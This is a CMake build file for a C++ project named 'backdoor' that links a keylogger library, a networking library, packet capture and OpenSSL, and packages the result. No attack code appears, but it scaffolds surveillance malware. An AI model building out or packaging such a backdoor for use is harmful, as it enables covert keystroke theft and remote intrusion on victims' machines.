cmake_minimum_required(VERSION 3.0.0)
project(backdoor VERSION 0.1.0)

set(CMAKE_CXX_STANDARD 11)

include(CTest)
enable_testing()

include(FindPCAP.cmake)

find_package(OpenSSL REQUIRED)
find_package(Threads REQUIRED)

add_executable(backdoor main.cpp crypto.cpp)

add_subdirectory(libs/keylogger)
add_subdirectory(libs/net)
target_link_libraries(backdoor keylogger net ${PCAP_LIBRARY} ${OPENSSL_CRYPTO_LIBRARY} ${CMAKE_THREAD_LIBS_INIT})

set(CPACK_PROJECT_NAME ${PROJECT_NAME})
set(CPACK_PROJECT_VERSION ${PROJECT_VERSION})
include(CPack)
